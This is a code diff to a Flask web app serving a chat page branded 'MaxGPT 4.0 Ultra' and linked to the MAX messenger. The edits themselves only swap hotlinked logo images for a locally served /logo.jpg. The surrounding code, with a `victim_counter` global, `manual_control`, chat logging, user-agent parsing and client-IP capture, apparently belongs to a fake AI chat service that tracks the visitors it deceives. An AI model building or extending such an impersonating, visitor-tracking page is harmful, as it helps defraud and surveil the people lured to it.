@@ -14,6 +14,7 @@ manual_control = {}
 victim_counter = 0
 chat_logs = []
 
+# Твое локальное время (+3 часа к UTC)
 LOCAL_ZONE = timezone(timedelta(hours=3))
 
 def parse_user_agent(ua_string):
@@ -98,7 +99,7 @@ HTML_PAGE = """<!DOCTYPE html>
         .settings-btn { background: none; border: 1px solid var(--border-color); color: var(--text-muted); width: 34px; height: 34px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
         .settings-btn:hover { background: rgba(139, 92, 246, 0.15); color: #8b5cf6; border-color: rgba(139, 92, 246, 0.3); }
 
-        .max-av-img { width: 38px; height: 38px; border-radius: 9px; object-fit: cover; flex-shrink: 0; background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%); }
+        .max-av-img { width: 38px; height: 38px; border-radius: 9px; object-fit: cover; flex-shrink: 0; background: #131417; }
 
         .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: var(--bg-main); min-width: 0; transition: background 0.3s; }
         .top-bar { height: 60px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; padding: 0 16px; background: var(--top-bar-bg); backdrop-filter: blur(10px); z-index: 10; }
@@ -273,7 +274,7 @@ HTML_PAGE = """<!DOCTYPE html>
     
     <div class="link-btns-group">
         <a href="https://vk.com" target="_blank" class="link-nav-btn"><i class="fa-solid fa-globe"></i> Открыть VK</a>
-        <a href="https://max.ru" target="_blank" class="link-nav-btn"><img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" style="width: 16px; height: 16px; border-radius: 4px; object-fit: cover;" alt="MAX"> Открыть MAX</a>
+        <a href="https://max.ru" target="_blank" class="link-nav-btn"><img src="/logo.jpg" style="width: 16px; height: 16px; border-radius: 4px; object-fit: cover;" alt="MAX"> Открыть MAX</a>
     </div>
 
     <div class="hist" id="historyList">
@@ -298,7 +299,7 @@ HTML_PAGE = """<!DOCTYPE html>
             <button class="menu-toggle" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
             <div class="model-dropdown">
                 <div class="model-btn" onclick="toggleModelMenu()">
-                    <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" style="width: 18px; height: 18px; border-radius: 4px; object-fit: cover;" alt="MAX">
+                    <img src="/logo.jpg" style="width: 18px; height: 18px; border-radius: 4px; object-fit: cover;" alt="MAX">
                     <span id="selectedModel">MaxGPT 4.0 Ultra</span>
                     <i class="fa-solid fa-chevron-down" style="font-size:10px; color:var(--text-muted); margin-left:4px;"></i>
                 </div>
@@ -317,7 +318,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
     <div id="chat">
         <div class="row bot">
-            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
+            <img src="/logo.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">
                     <span>MaxGPT AI</span>
@@ -671,7 +672,7 @@ async function startNewChat() {
     let sId = 'vcp_scrub_' + Date.now();
     document.getElementById("chat").innerHTML = `
         <div class="row bot">
-            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
+            <img src="/logo.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">
                     <span>MaxGPT AI</span>
@@ -735,7 +736,7 @@ async function fetchMessages() {
 
     let html = `
         <div class="row bot">
-            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
+            <img src="/logo.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">
                     <span>MaxGPT AI</span>
@@ -795,7 +796,7 @@ async function fetchMessages() {
                 <button class="action-icon-btn" onclick="startVoiceMP3(this, '${msgPId}', '${msgAId}', '${msgTId}', '${msgWId}', '${msgSId}')"><i class="fa-solid fa-volume-high"></i> Озвучить</button>
             </div>`;
         html += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${m.user}${imgTag}</div></div></div>`;
-        html += `<div class="row bot"><img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span></div><div class="txt">${botText}</div>${botActionsHtml}</div></div>`;
+        html += `<div class="row bot"><img src="/logo.jpg" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author"><span>MaxGPT AI</span></div><div class="txt">${botText}</div>${botActionsHtml}</div></div>`;
     });
 
     c.innerHTML = html;
@@ -844,7 +845,7 @@ async function send(){
     
     c.innerHTML += `
         <div class="row bot" id="tempTypingRow">
-            <img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX">
+            <img src="/logo.jpg" class="max-av-img" alt="MAX">
             <div class="msg-container">
                 <div class="bot-author">MaxGPT AI</div>
                 <div class="typing-indicator">
@@ -882,7 +883,7 @@ async function send(){
     } catch(err) {
         let tempRow = document.getElementById("tempTypingRow");
         if(tempRow) tempRow.remove();
-        c.innerHTML += `<div class="row bot"><img src="https://cyclowiki.org/images/thumb/7/77/MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg/600px-MAX_%D0%BC%D0%B5%D1%81%D1%81%D0%B5%D0%BD%D0%B4%D0%B6%D0%B5%D1%80.jpg" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
+        c.innerHTML += `<div class="row bot"><img src="/logo.jpg" class="max-av-img" alt="MAX"><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt" style="color:#f87171;">Ошибка соединения с сервером.</div></div></div>`;
     }
     
     setInputLocked(false);
@@ -1107,6 +1108,10 @@ def get_clean_ip():
     if request.headers.getlist("X-Forwarded-For"):
         return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
     return request.remote_addr
+
+@app.route("/logo.jpg")
+def serve_logo():
+    return send_from_directory(os.getcwd(), "logo.jpg")
 
 @app.route("/mysound.wav")
 def serve_audio():
